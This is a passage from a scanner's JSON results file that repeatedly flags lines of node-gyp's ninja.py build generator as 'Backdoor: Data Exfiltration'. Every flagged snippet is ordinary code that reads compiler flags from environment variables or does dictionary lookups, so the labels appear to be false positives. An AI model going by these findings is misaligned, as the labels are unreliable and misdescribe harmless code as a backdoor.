                      "markdown": "`        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1120,
                  "startColumn": 26,
                  "endLine": 1120,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            )\n        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n",
                    "rendered": {
                      "text": "            )\n        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n",
                      "markdown": "`            )\n        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1115,
                  "startColumn": 28,
                  "endLine": 1115,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n        elif self.toolset == \"host\":\n",
                    "rendered": {
                      "text": "            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n        elif self.toolset == \"host\":\n",
                      "markdown": "`            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n        elif self.toolset == \"host\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1114,
                  "startColumn": 26,
                  "endLine": 1114,
                  "endColumn": 31,
                  "snippet": {
                    "text": "                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n",
                    "rendered": {
                      "text": "                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n",
                      "markdown": "`                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CXXFLAGS\", \"\").split()\n                + cflags_cc\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1110,
                  "startColumn": 28,
                  "endLine": 1110,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n",
                    "rendered": {
                      "text": "        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n",
                      "markdown": "`        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1109,
                  "startColumn": 26,
                  "endLine": 1109,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        # flags can still override them.\n        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n",
                    "rendered": {
                      "text": "        # flags can still override them.\n        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n",
                      "markdown": "`        # flags can still override them.\n        if self.toolset == \"target\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS\", \"\").split()\n                + os.environ.get(\"CFLAGS\", \"\").split()\n                + cflags_c\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1103,
                  "startColumn": 30,
                  "endLine": 1103,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        else:\n            cflags = config.get(\"cflags\", [])\n            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n        # Respect environment variables related to build, but target-specific\n        # flags can still override them.\n",
                    "rendered": {
                      "text": "        else:\n            cflags = config.get(\"cflags\", [])\n            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n        # Respect environment variables related to build, but target-specific\n        # flags can still override them.\n",
                      "markdown": "`        else:\n            cflags = config.get(\"cflags\", [])\n            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n        # Respect environment variables related to build, but target-specific\n        # flags can still override them.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1102,
                  "startColumn": 29,
                  "endLine": 1102,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            self.WriteVariableList(ninja_file, \"pchprefix\", [self.name])\n        else:\n            cflags = config.get(\"cflags\", [])\n            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n        # Respect environment variables related to build, but target-specific\n",
                    "rendered": {
                      "text": "            self.WriteVariableList(ninja_file, \"pchprefix\", [self.name])\n        else:\n            cflags = config.get(\"cflags\", [])\n            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n        # Respect environment variables related to build, but target-specific\n",
                      "markdown": "`            self.WriteVariableList(ninja_file, \"pchprefix\", [self.name])\n        else:\n            cflags = config.get(\"cflags\", [])\n            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n        # Respect environment variables related to build, but target-specific\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1101,
                  "startColumn": 27,
                  "endLine": 1101,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            self.WriteVariableList(ninja_file, \"pdbname_cc\", [pdbpath_cc])\n            self.WriteVariableList(ninja_file, \"pchprefix\", [self.name])\n        else:\n            cflags = config.get(\"cflags\", [])\n            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n",
                    "rendered": {
                      "text": "            self.WriteVariableList(ninja_file, \"pdbname_cc\", [pdbpath_cc])\n            self.WriteVariableList(ninja_file, \"pchprefix\", [self.name])\n        else:\n            cflags = config.get(\"cflags\", [])\n            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n",
                      "markdown": "`            self.WriteVariableList(ninja_file, \"pdbname_cc\", [pdbpath_cc])\n            self.WriteVariableList(ninja_file, \"pchprefix\", [self.name])\n        else:\n            cflags = config.get(\"cflags\", [])\n            cflags_c = config.get(\"cflags_c\", [])\n            cflags_cc = config.get(\"cflags_cc\", [])\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 937,
                  "startColumn": 28,
                  "endLine": 937,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        }\n        settings = self.xcode_settings.xcode_settings[self.config_name]\n        for settings_key, arg_name in settings_to_arg.items():\n            value = settings.get(settings_key)\n            if value:\n                extra_arguments[arg_name] = value\n\n",
                    "rendered": {
                      "text": "        }\n        settings = self.xcode_settings.xcode_settings[self.config_name]\n        for settings_key, arg_name in settings_to_arg.items():\n            value = settings.get(settings_key)\n            if value:\n                extra_arguments[arg_name] = value\n\n",
                      "markdown": "`        }\n        settings = self.xcode_settings.xcode_settings[self.config_name]\n        for settings_key, arg_name in settings_to_arg.items():\n            value = settings.get(settings_key)\n            if value:\n                extra_arguments[arg_name] = value\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 775,
                  "startColumn": 24,
                  "endLine": 775,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n                was_mac_bundle_resource = source in mac_bundle_resources\n                if was_mac_bundle_resource or int(\n                    rule.get(\"process_outputs_as_mac_bundle_resources\", False)\n                ):\n                    extra_mac_bundle_resources += outputs\n                    # Note: This is n_resources * n_outputs_in_rule.\n",
                    "rendered": {
                      "text": "\n                was_mac_bundle_resource = source in mac_bundle_resources\n                if was_mac_bundle_resource or int(\n                    rule.get(\"process_outputs_as_mac_bundle_resources\", False)\n                ):\n                    extra_mac_bundle_resources += outputs\n                    # Note: This is n_resources * n_outputs_in_rule.\n",
                      "markdown": "`\n                was_mac_bundle_resource = source in mac_bundle_resources\n                if was_mac_bundle_resource or int(\n                    rule.get(\"process_outputs_as_mac_bundle_resources\", False)\n                ):\n                    extra_mac_bundle_resources += outputs\n                    # Note: This is n_resources * n_outputs_in_rule.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 770,
                  "startColumn": 27,
                  "endLine": 770,
                  "endColumn": 32,
                  "snippet": {
                    "text": "                    for o in rule[\"outputs\"]\n                ]\n\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources += outputs\n\n                was_mac_bundle_resource = source in mac_bundle_resources\n",
                    "rendered": {
                      "text": "                    for o in rule[\"outputs\"]\n                ]\n\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources += outputs\n\n                was_mac_bundle_resource = source in mac_bundle_resources\n",
                      "markdown": "`                    for o in rule[\"outputs\"]\n                ]\n\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources += outputs\n\n                was_mac_bundle_resource = source in mac_bundle_resources\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 746,
                  "startColumn": 26,
                  "endLine": 746,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            # If there are n source files matching the rule, and m additional rule\n            # inputs, then adding 'inputs' to each build edge written below will\n            # write m * n inputs. Collapsing reduces this to m + n.\n            sources = rule.get(\"rule_sources\", [])\n            num_inputs = len(inputs)\n            if prebuild:\n                num_inputs += 1\n",
                    "rendered": {
                      "text": "            # If there are n source files matching the rule, and m additional rule\n            # inputs, then adding 'inputs' to each build edge written below will\n            # write m * n inputs. Collapsing reduces this to m + n.\n            sources = rule.get(\"rule_sources\", [])\n            num_inputs = len(inputs)\n            if prebuild:\n                num_inputs += 1\n",
                      "markdown": "`            # If there are n source files matching the rule, and m additional rule\n            # inputs, then adding 'inputs' to each build edge written below will\n            # write m * n inputs. Collapsing reduces this to m + n.\n            sources = rule.get(\"rule_sources\", [])\n            num_inputs = len(inputs)\n            if prebuild:\n                num_inputs += 1\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 741,
                  "startColumn": 63,
                  "endLine": 741,
                  "endColumn": 68,
                  "snippet": {
                    "text": "                    return path.replace(\"\\\\\", \"/\")\n                return path\n\n            inputs = [self.GypPathToNinja(i, env) for i in rule.get(\"inputs\", [])]\n\n            # If there are n source files matching the rule, and m additional rule\n            # inputs, then adding 'inputs' to each build edge written below will\n",
                    "rendered": {
                      "text": "                    return path.replace(\"\\\\\", \"/\")\n                return path\n\n            inputs = [self.GypPathToNinja(i, env) for i in rule.get(\"inputs\", [])]\n\n            # If there are n source files matching the rule, and m additional rule\n            # inputs, then adding 'inputs' to each build edge written below will\n",
                      "markdown": "`                    return path.replace(\"\\\\\", \"/\")\n                return path\n\n            inputs = [self.GypPathToNinja(i, env) for i in rule.get(\"inputs\", [])]\n\n            # If there are n source files matching the rule, and m additional rule\n            # inputs, then adding 'inputs' to each build edge written below will\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 716,
                  "startColumn": 40,
                  "endLine": 716,
                  "endColumn": 45,
                  "snippet": {
                    "text": "                if self.flavor == \"win\"\n                else None\n            )\n            pool = \"console\" if int(rule.get(\"ninja_use_console\", 0)) else None\n            rule_name, args = self.WriteNewNinjaRule(\n                name, args, description, win_shell_flags, env, pool\n            )\n",
                    "rendered": {
                      "text": "                if self.flavor == \"win\"\n                else None\n            )\n            pool = \"console\" if int(rule.get(\"ninja_use_console\", 0)) else None\n            rule_name, args = self.WriteNewNinjaRule(\n                name, args, description, win_shell_flags, env, pool\n            )\n",
                      "markdown": "`                if self.flavor == \"win\"\n                else None\n            )\n            pool = \"console\" if int(rule.get(\"ninja_use_console\", 0)) else None\n            rule_name, args = self.WriteNewNinjaRule(\n                name, args, description, win_shell_flags, env, pool\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 708,
                  "startColumn": 20,
                  "endLine": 708,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            args = rule[\"action\"]\n            description = self.GenerateDescription(\n                \"RULE\",\n                rule.get(\"message\", None),\n                (\"%s \" + generator_default_variables[\"RULE_INPUT_PATH\"]) % name,\n            )\n            win_shell_flags = (\n",
                    "rendered": {
                      "text": "            args = rule[\"action\"]\n            description = self.GenerateDescription(\n                \"RULE\",\n                rule.get(\"message\", None),\n                (\"%s \" + generator_default_variables[\"RULE_INPUT_PATH\"]) % name,\n            )\n            win_shell_flags = (\n",
                      "markdown": "`            args = rule[\"action\"]\n            description = self.GenerateDescription(\n                \"RULE\",\n                rule.get(\"message\", None),\n                (\"%s \" + generator_default_variables[\"RULE_INPUT_PATH\"]) % name,\n            )\n            win_shell_flags = (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 699,
                  "startColumn": 48,
                  "endLine": 699,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        all_outputs = []\n        for rule in rules:\n            # Skip a rule with no action and no inputs.\n            if \"action\" not in rule and not rule.get(\"rule_sources\", []):\n                continue\n\n            # First write out a rule for the rule action.\n",
                    "rendered": {
                      "text": "        all_outputs = []\n        for rule in rules:\n            # Skip a rule with no action and no inputs.\n            if \"action\" not in rule and not rule.get(\"rule_sources\", []):\n                continue\n\n            # First write out a rule for the rule action.\n",
                      "markdown": "`        all_outputs = []\n        for rule in rules:\n            # Skip a rule with no action and no inputs.\n            if \"action\" not in rule and not rule.get(\"rule_sources\", []):\n                continue\n\n            # First write out a rule for the rule action.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 675,
                  "startColumn": 25,
                  "endLine": 675,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            inputs = [self.GypPathToNinja(i, env) for i in action[\"inputs\"]]\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += action[\"outputs\"]\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += action[\"outputs\"]\n            outputs = [self.GypPathToNinja(o, env) for o in action[\"outputs\"]]\n\n",
                    "rendered": {
                      "text": "            inputs = [self.GypPathToNinja(i, env) for i in action[\"inputs\"]]\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += action[\"outputs\"]\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += action[\"outputs\"]\n            outputs = [self.GypPathToNinja(o, env) for o in action[\"outputs\"]]\n\n",
                      "markdown": "`            inputs = [self.GypPathToNinja(i, env) for i in action[\"inputs\"]]\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += action[\"outputs\"]\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += action[\"outputs\"]\n            outputs = [self.GypPathToNinja(o, env) for o in action[\"outputs\"]]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 673,
                  "startColumn": 25,
                  "endLine": 673,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            )\n\n            inputs = [self.GypPathToNinja(i, env) for i in action[\"inputs\"]]\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += action[\"outputs\"]\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += action[\"outputs\"]\n",
                    "rendered": {
                      "text": "            )\n\n            inputs = [self.GypPathToNinja(i, env) for i in action[\"inputs\"]]\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += action[\"outputs\"]\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += action[\"outputs\"]\n",
                      "markdown": "`            )\n\n            inputs = [self.GypPathToNinja(i, env) for i in action[\"inputs\"]]\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += action[\"outputs\"]\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += action[\"outputs\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 667,
                  "startColumn": 42,
                  "endLine": 667,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            depfile = action.get(\"depfile\", None)\n            if depfile:\n                depfile = self.ExpandSpecial(depfile, self.base_to_build)\n            pool = \"console\" if int(action.get(\"ninja_use_console\", 0)) else None\n            rule_name, _ = self.WriteNewNinjaRule(\n                name, args, description, win_shell_flags, env, pool, depfile=depfile\n            )\n",
                    "rendered": {
                      "text": "            depfile = action.get(\"depfile\", None)\n            if depfile:\n                depfile = self.ExpandSpecial(depfile, self.base_to_build)\n            pool = \"console\" if int(action.get(\"ninja_use_console\", 0)) else None\n            rule_name, _ = self.WriteNewNinjaRule(\n                name, args, description, win_shell_flags, env, pool, depfile=depfile\n            )\n",
                      "markdown": "`            depfile = action.get(\"depfile\", None)\n            if depfile:\n                depfile = self.ExpandSpecial(depfile, self.base_to_build)\n            pool = \"console\" if int(action.get(\"ninja_use_console\", 0)) else None\n            rule_name, _ = self.WriteNewNinjaRule(\n                name, args, description, win_shell_flags, env, pool, depfile=depfile\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 664,
                  "startColumn": 28,
                  "endLine": 664,
                  "endColumn": 33,
                  "snippet": {
                    "text": "                else None\n            )\n            args = action[\"action\"]\n            depfile = action.get(\"depfile\", None)\n            if depfile:\n                depfile = self.ExpandSpecial(depfile, self.base_to_build)\n            pool = \"console\" if int(action.get(\"ninja_use_console\", 0)) else None\n",
                    "rendered": {
                      "text": "                else None\n            )\n            args = action[\"action\"]\n            depfile = action.get(\"depfile\", None)\n            if depfile:\n                depfile = self.ExpandSpecial(depfile, self.base_to_build)\n            pool = \"console\" if int(action.get(\"ninja_use_console\", 0)) else None\n",
                      "markdown": "`                else None\n            )\n            args = action[\"action\"]\n            depfile = action.get(\"depfile\", None)\n            if depfile:\n                depfile = self.ExpandSpecial(depfile, self.base_to_build)\n            pool = \"console\" if int(action.get(\"ninja_use_console\", 0)) else None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 656,
                  "startColumn": 32,
                  "endLine": 656,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            # First write out a rule for the action.\n            name = \"{}_{}\".format(action[\"action_name\"], self.hash_for_rules)\n            description = self.GenerateDescription(\n                \"ACTION\", action.get(\"message\", None), name\n            )\n            win_shell_flags = (\n                self.msvs_settings.GetRuleShellFlags(action)\n",
                    "rendered": {
                      "text": "            # First write out a rule for the action.\n            name = \"{}_{}\".format(action[\"action_name\"], self.hash_for_rules)\n            description = self.GenerateDescription(\n                \"ACTION\", action.get(\"message\", None), name\n            )\n            win_shell_flags = (\n                self.msvs_settings.GetRuleShellFlags(action)\n",
                      "markdown": "`            # First write out a rule for the action.\n            name = \"{}_{}\".format(action[\"action_name\"], self.hash_for_rules)\n            description = self.GenerateDescription(\n                \"ACTION\", action.get(\"message\", None), name\n            )\n            win_shell_flags = (\n                self.msvs_settings.GetRuleShellFlags(action)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 595,
                  "startColumn": 39,
                  "endLine": 595,
                  "endColumn": 44,
                  "snippet": {
